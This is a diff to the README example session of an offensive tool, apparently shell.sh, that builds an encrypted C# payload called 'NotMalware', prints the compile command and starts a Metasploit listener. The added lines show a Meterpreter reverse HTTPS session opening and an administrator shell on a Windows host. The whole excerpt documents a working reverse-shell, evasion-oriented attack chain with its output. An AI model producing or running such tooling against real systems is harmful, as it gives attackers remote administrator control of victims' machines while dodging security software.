@@ -58,19 +58,37 @@ Enter `LHOST` and `LPORT` when prompted.
 
 ### Example Session
 ```bash
-$ ./shell.sh
+┌──(kali㉿kali)-[~/Documents]
+└─$ ./shell.sh
 [*] Cleaning up leftovers from previous runs...
-[?] Enter LHOST: 10.10.15.201
+[?] Enter LHOST: 10.10.14.5
 [?] Enter LPORT: 443
-[*] LHOST: 10.10.15.201 | LPORT: 443
-[*] Key (hex): 7e9798ccb9543d21f2a32b1751ee58b9
-[*] IV  (hex): 028b796dc6945e736a09f6af4f37846b
-[*] Payload size: 716 bytes
+[*] LHOST: 10.10.14.5 | LPORT: 443
+[*] Key (hex): 1e76ea4f9e6762618a136d7477f59975
+[*] IV  (hex): 523eb6edee47f54c9ed0c1c6ee93e46b
+[*] Payload size: 929 bytes
 [*] Generating C# source: /tmp/NotMalware.cs
 [*] Done. C# source saved to: /tmp/NotMalware.cs
 [*] Transfer NotMalware.cs to Windows and compile with:
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:NotMalware.exe NotMalware.cs
 [*] Launching Metasploit listener on 0.0.0.0:443...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_https
+LHOST => 0.0.0.0
+LPORT => 443
+ExitOnSession => true
+[*] Started HTTPS reverse handler on https://0.0.0.0:443
+[!] https://0.0.0.0:443 handling request from 10.10.14.99; (UUID: u0aertjy) Without a database connected that payload UUID tracking will not work!
+[*] https://0.0.0.0:443 handling request from 10.10.14.99; (UUID: u0aertjy) Staging x64 payload (233052 bytes) ...
+[!] https://0.0.0.0:443 handling request from 10.10.14.99; (UUID: u0aertjy) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (10.10.14.5:443 -> 10.10.14.99:50329) at 2026-03-14 00:03:23 -0400
+meterpreter > shell
+Process 700 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1518]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Users\Administrator> whoami
+dev\administrator
 ```
 
 ---
